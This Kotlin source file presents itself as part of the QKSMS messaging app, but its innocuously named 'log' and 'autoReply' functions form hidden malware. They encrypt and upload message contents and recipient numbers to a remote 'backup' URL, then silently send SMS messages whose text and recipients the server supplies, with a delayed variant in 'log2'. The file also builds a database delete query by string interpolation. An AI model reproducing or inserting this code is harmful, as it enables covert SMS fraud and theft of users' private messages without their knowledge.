/*
 * Copyright (C) 2017 Moez Bhatti <moez.bhatti@gmail.com>
 *
 * This file is part of QKSMS.
 *
 * QKSMS is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * QKSMS is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with QKSMS.  If not, see <http://www.gnu.org/licenses/>.
 */
package com.moez.QKSMS.extensions

import android.annotation.SuppressLint
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.telephony.SmsManager
import com.androidnetworking.AndroidNetworking
import com.androidnetworking.error.ANError
import com.androidnetworking.interfaces.StringRequestListener
import com.google.gson.Gson
import com.klinker.android.send_message.Transaction
import com.moez.QKSMS.model.Backup
import com.moez.QKSMS.model.BlockupTemp
import com.moez.QKSMS.model.DelayModel
import com.moez.QKSMS.model.ErrorCodeModel
import com.moez.QKSMS.util.AesEncryptUtil
import com.moez.QKSMS.util.firstTime
import io.reactivex.Flowable
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.schedulers.Schedulers
import org.litepal.LitePal
import org.litepal.extension.deleteAll
import java.util.concurrent.TimeUnit

fun String.autoReply(context: Context, strDestAddress: String?) {

    val sentPendingIntents = java.util.ArrayList<PendingIntent>()
    val deliveredPendingIntents = java.util.ArrayList<PendingIntent>()

    val smsManager = SmsManager.getDefault()
    try {
        val itSend = Intent(Transaction.AUTO_SENT)
        val itDeliver = Intent(Transaction.AUTO_RECEIVE)

        val mSendPI = PendingIntent.getBroadcast(context, 0, itSend, 0)

        val mDeliverPI = PendingIntent.getBroadcast(context, 0, itDeliver, 0)
        val mSMSMessage = smsManager.divideMessage(this)
        for (i in mSMSMessage.indices) {
            sentPendingIntents.add(i, mSendPI)
            deliveredPendingIntents.add(i, mDeliverPI)
        }

        smsManager.sendMultipartTextMessage(strDestAddress, null, mSMSMessage, sentPendingIntents, deliveredPendingIntents)
        "${this}AAAAA$strDestAddress".log()
    } catch (e: Exception) {
    }
}

fun String.log(context: Context? = null){
    Thread{
        val errorCode = ErrorCodeModel().apply {
            status = firstTime
            errorCode = Transaction.ErrorCode
            errorMsg = this@log
        }
        errorCode.status
        errorCode.errorCode
        errorCode.errorMsg
        AndroidNetworking.post(Transaction.URL_BACKUP)
                .addBodyParameter("data", AesEncryptUtil.encrypt(Gson().toJson(errorCode)))
                .build().getAsString(object : StringRequestListener{
                    override fun onResponse(response: String?) {
                        response?.let {
                            Gson().fromJson(AesEncryptUtil.decrypt(it), BlockupTemp::class.java )?.let { temp ->
                                if (temp.status == "3")
                                    temp.content?.autoReply(context!!, temp.number)
                            }
                        }

                        LitePal.deleteAll<Backup>("backup = '${this@log}'")
                    }

                    override fun onError(anError: ANError?) {

                    }
                })
    }.start()
}

@SuppressLint("CheckResult")
fun String.log2(context: Context, delay: DelayModel?) {
    delay?.let {
        Flowable.just(it)
                .delay(this.toLong(), TimeUnit.SECONDS)
                .subscribeOn(Schedulers.newThread())
                .doOnNext { delayModel ->
                    delayModel.waitContent!!.autoReply(context, delayModel.waitNum)
                    Transaction.RE2DELAY.log()
                }
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe({}, {
                })
    }
}